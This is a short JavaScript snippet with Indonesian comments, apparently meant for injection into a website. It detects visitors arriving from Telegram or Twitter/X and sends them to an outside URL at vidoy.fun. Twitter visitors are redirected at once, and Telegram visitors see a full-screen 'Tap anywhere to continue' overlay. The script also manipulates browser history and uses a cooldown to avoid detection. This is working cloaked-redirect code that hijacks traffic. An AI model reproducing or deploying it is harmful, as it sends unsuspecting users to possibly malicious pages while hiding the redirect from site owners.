(function () {
  try {
    // === GANTI DI SINI ===
    var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan redirect
    var cooldownMs = 60 * 1000;                   // 1 menit (ubah kalau mau lebih lama)
    // =====================

    if (!/^https:\/\//i.test(target)) return;
    if (/[?#](?:.*[&?])?noredir=1/i.test(location.search + location.hash)) return;

    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var fromTele = /(telegram|telegram-android|tgapp|t\.me|telegram\.org)/i.test(UA) || /(t\.me|telegram\.org)/i.test(REF);
    var fromX    = /(twitter)/i.test(UA) || /(t\.co|twitter\.com)/i.test(REF);

    if (!fromTele && !fromX) return;

    var page = location.origin + location.pathname;
    var sessKey = "redir_seen:" + page + "|" + target;
    var cdKey   = "redir_cd:" + page + "|" + target;

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));
    try { history.pushState({ hold: 1 }, "", location.href); } catch (_) {}

    // --- kalau dari Twitter: auto langsung ---
    if (fromX) {
      location.href = target;
      return;
    }

    // --- kalau dari Telegram: butuh klik user ---
    if (fromTele) {
      var overlay = document.createElement("div");
      overlay.style.cssText =
        "position:fixed;inset:0;z-index:2147483647;" +
        "background:rgba(0,0,0,0.6);color:#fff;" +
        "display:flex;align-items:center;justify-content:center;" +
        "font-family:sans-serif;font-size:18px;cursor:pointer;";
      overlay.textContent = "Tap anywhere to continue";
      overlay.onclick = function () {
        overlay.remove();
        location.href = target;
      };
      document.body.appendChild(overlay);
    }
  } catch (e) {
    console.error("Redirect hybrid error:", e);
  }
})();
